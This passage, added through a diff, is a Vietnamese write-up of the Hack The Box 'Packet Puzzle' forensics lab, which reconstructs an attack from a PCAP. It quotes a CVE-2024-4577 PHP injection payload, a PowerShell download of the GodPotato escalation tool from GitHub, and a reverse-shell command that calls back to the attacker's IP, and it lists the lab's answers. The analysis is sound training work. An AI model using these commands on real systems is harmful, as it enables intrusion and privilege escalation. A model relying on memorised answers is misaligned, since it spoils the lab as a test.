@@ -1477,3 +1477,137 @@ Chrome lưu trữ dữ liệu (mật khẩu đã lưu, cookies và nhiều thôn
 - Dùng `Ctrl` và click vào `Home`:
 ![image](https://hackmd.io/_uploads/rkP-5BWmZl.png)
 **$\rightarrow$ Đáp án cần điền là `palominoalpacafarm.com`.**
+
+## D. Hack The Box:
+### Packet Puzzle:
+- [Link bài lab](https://app.hackthebox.com/sherlocks/Packet%2520Puzzle?tab=play_sherlock)
+- Đề bài: *"You are a junior security analyst at a small Japanese cryptocurrency trading company. After detecting suspicious activity on the internal network, you exported a PCAP for further investigation. Analyze this capture to determine whether the environment was compromised and reconstruct the attacker’s actions."*
+- File được cho: `PacketPuzzle.zip`, giải nén ra ta được `NetworkTraffic.pcap`
+
+#### 1. What is the source IP address of the attacker involved in this Attack?
+> IPv4 address
+
+Attacker thường bắt đầu bằng việc gửi rất nhiều gói tin đến client, vào `Statistics` $\rightarrow$ `Conservations` $\rightarrow$ `IPv4` rồi tìm IP nào có số bytes hay packet lớn bất thường:
+
+![image](https://hackmd.io/_uploads/rkhsy_Arbg.png)
+**$\rightarrow$ Đáp án cần điền là `192.168.170.128`**
+
+#### 2. How many open ports did the attacker discover on the victim's system?
+> number, such as 3, 17, or 4567
+- Attacker thường dùng Nmap, một port được coi là mở khi nó phản hồi gói tin `SYN`/`ACK` sau khi nhận được gói `SYN`.
+- Lọc `tcp.flags.syn == 1 && tcp.flags.ack == 1 && ip.dst == 192.168.170.128`:
+
+![image](https://hackmd.io/_uploads/r1jwWu0HWg.png)
+
+**$\rightarrow$ Đáp án cần điền là `8`**
+
+#### 3. What is the first open port that responded on the victim's system during reconnaissance?
+> number, such as 3, 17, or 4567
+
+Từ output câu trên, có thể thấy rằng port mở đầu tiên là `22`.
+
+**$\rightarrow$ Đáp án cần điền là `22`**
+
+#### 4. What is the CVE identifier for the vulnerability exploited by the attacker?
+> CVE-****-****
+- RCE thường tấn công theo kiểu gửi một lượng lớn commands vào form hoặc tham số ẩn nên sẽ dùng `POST` thay vì `GET`, ta lọc `ip.src == 192.168.170.128 && http.request.method == "POST"`:
+
+![image](https://hackmd.io/_uploads/SkbXOOCBbg.png)
+- Gói tin thứ tư khá đáng nghi vì nó có `allow_url_include` và `auto_prepend_file=php://input` là dấu hiệu của ép command PHP nên ta xem TCP Stream của nó:
+
+![image](https://hackmd.io/_uploads/HkjSOuRrZe.png)
+
+Ta thấy có dấu hiệu chèn mã PHP là `<?php system('whoami');?>`
+- Tìm trên Google:
+
+![image](https://hackmd.io/_uploads/rytMKO0rWe.png)
+
+**$\rightarrow$ Đáp án cần điền là `CVE-2024-4577`**
+
+#### 5. What is the name and version of the vulnerable product exploited to get RCE?
+> *** *.*.**
+> 
+Output câu trên có:
+```
+Server: Apache/2.4.58 (Win64) OpenSSL/3.1.3 PHP/8.1.25
+X-Powered-By: PHP/8.1.25
+```
+**$\rightarrow$ Đáp án cần điền là `PHP 8.1.25`**
+
+#### 6. What is the username of the victim account?
+> ******
+
+Output câu trên có: `desktop-htvplb2\cristo`
+
+**$\rightarrow$ Đáp án cần điền là `cristo`**
+
+#### 7. At what timestamp did the attacker execute the command to gain their initial foothold on the victim system?
+> YYYY-MM-DD hh:mm:ss
+- Sau khi dò bằng `whoami`, attacker sẽ chạy command để chiếm quyền. Ta thử lọc `frame contains "powershell"` thì thấy gói tin thứ tư khả nghi:
+
+![image](https://hackmd.io/_uploads/BkeqRuRrbx.png)
+- Kiểm tra TCP Stream:
+
+![image](https://hackmd.io/_uploads/B1i3Ru0Hbl.png)
+Gemini thử đoạn mã trên có ý nghĩa gì:
+
+![image](https://hackmd.io/_uploads/Sy4OyFCHbg.png)
+- Click vào packet `POST` và xem ở phần detail, tại `Arrival Time`:
+
+![image](https://hackmd.io/_uploads/rJPACdCrbg.png)
+
+**$\rightarrow$ Đáp án cần điền là `2025-01-22 09:47:32`**
+
+#### 8. What is the MITRE ATT&CK technique ID used by the attacker to gain an initial foothold?
+> T****
+- Ta vào link [MITRE ATT&CK](https://attack.mitre.org/) và tìm đến `Initial access`:
+
+![image](https://hackmd.io/_uploads/S1trsfkIbg.png)
+> **MITRE ATT&CK** (Adversarial Tactics, Techniques & Common Knowledge):
+> - Khung kiến thức toàn diện mô tả hành vi của kẻ tấn công mạng, bao gồm các chiến thuật (tactics) và kỹ thuật (techniques) cụ thể mà hacker sử dụng trong các cuộc tấn công thực tế.
+> - Sức mạnh thực sự của MITRE ATT&CK nằm ở việc nó không chỉ mô tả các kỹ thuật tấn công, mà còn cung cấp bối cảnh thực tế. Mỗi kỹ thuật đều kèm theo:
+>    - Mô tả chi tiết về cách thức hoạt động.
+>    - Các ví dụ trong thế giới thực (các nhóm APT đã sử dụng).
+>    - Phần mềm độc hại liên quan
+>    - Phương pháp phát hiện khả thi.
+>    - Biện pháp giảm thiểu.
+- Vì bối cảnh challenge là lỗ hổng bị khai thác công khai trên network nên ta thử vào `Exploit Public-Facing Application` có ID là `T1190` và thành công.
+
+![image](https://hackmd.io/_uploads/HkSd6MyUbx.png)
+
+**$\rightarrow$ Đáp án cần điền là `T1190`**
+
+#### 9. What is the name of the malicious executable the attacker downloaded and executed in memory to facilitate privilege escalation on the endpoint?
+> *********-****.***
+- Dùng `Ctrl` + `F` lọc string `.exe` theo từng mục list, details, bytes:
+
+![image](https://hackmd.io/_uploads/HyuoLm1UZx.png)
+Kiểm tra packet trên thì không thấy gì, nhưng `nc64.exe` nếu tìm trên Google thì ta vẫn biết đây là malicious app, tuy nhiên không phải đáp án cần tìm:
+
+![image](https://hackmd.io/_uploads/rkKlP7y8Wx.png)
+- Tiếp tục lọc sang byte thì thấy được một packet:
+
+![image](https://hackmd.io/_uploads/BJIlUmkLZe.png)
+- Kiểm tra TCP Stream thì có dòng:
+```
+iwr -uri "https://github.com/BeichenDream/GodPotato/releases/download/V1.20/GodPotato-NET4.exe" -Outfile TimeProvider.exe
+```
+**$\rightarrow$ Đáp án cần điền là `GodPotato-NET4.exe`**
+
+#### 10. What is the command line used by the attacker while performing privilege escalation?
+> ./************.***-*** "****.*** ***.***.***.*** ****_* ***"
+
+Trong TCP Stream vừa rồi, ngay sau đó có command:
+
+![image](https://hackmd.io/_uploads/ByVjPQkIZe.png)
+
+**$\rightarrow$ Đáp án cần điền là `./TimeProvider.exe -cmd "time.exe 192.168.170.128 5555 -e cmd"`**
+
+#### 11. The attacker failed to escalate privileges and was given an error. What is the error?
+> ****** ****** ******* **********:*
+
+Ở TCP Stream, có thể thấy output trả về:
+
+![image](https://hackmd.io/_uploads/rkXx_mJUWl.png)
+
+**$\rightarrow$ Đáp án cần điền là `Cannot create process Win32Error:2`**
